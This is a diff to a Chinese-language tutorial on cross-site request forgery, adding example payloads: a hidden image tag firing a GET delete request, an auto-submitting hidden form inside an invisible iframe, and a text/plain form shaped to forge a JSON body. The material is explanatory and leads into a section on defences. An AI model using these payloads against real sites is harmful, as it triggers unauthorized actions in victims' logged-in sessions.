@@ -56,7 +56,7 @@ CSRF (Cross-site request forgery) 跨站偽造請求，**駭客** 利用使用�
 
 - **主動**
 
-  進入網站時，就自動送出 **請求**
+  進入網站時，就 **自動送出請求**
 
   ```html
   <img src="https://www.admin.com/delete?id=3" width="0" height="0" />
@@ -67,7 +67,41 @@ CSRF (Cross-site request forgery) 跨站偽造請求，**駭客** 利用使用�
 
 ### POST
 
+如果**刪除功能** 是 ` POST`，駭客也可以使用 `<form>` 來主動提交表單，這是藉由 `<iframe>` 來隱藏 `<form>` 的表單顯示。[stackoverflow](https://stackoverflow.com/questions/17940811/example-of-silently-submitting-a-post-form-csrf)
+
+```html {1,3,4,8,13}
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form
+  method="POST"
+  action="https://www.admin.com/delete"
+  target="csrf-frame"
+  id="csrf-form"
+>
+  <input type="hidden" name="id" value="3" />
+  <input type="submit" value="submit" />
+</form>
+
+<script>
+  document.getElementById('csrf-form').submit()
+</script>
+```
+
+> 當進入網站，就送出表單。
+
 ### JSON 傳送
+
+常見與後端溝通的 `json` ，也是有機會被攻擊，主要是透過 **字元** 組合達到指定的 `json` 樣式。
+
+```html {4,}
+<form
+  action="https://small-min.blog.com/delete"
+  method="post"
+  enctype="text/plain"
+>
+  <input name='{"id":3, "ignore_me":"' value='test"}' type="hidden" />
+  <input type="submit" value="delete!" />
+</form>
+```
 
 ## 防禦方式
 
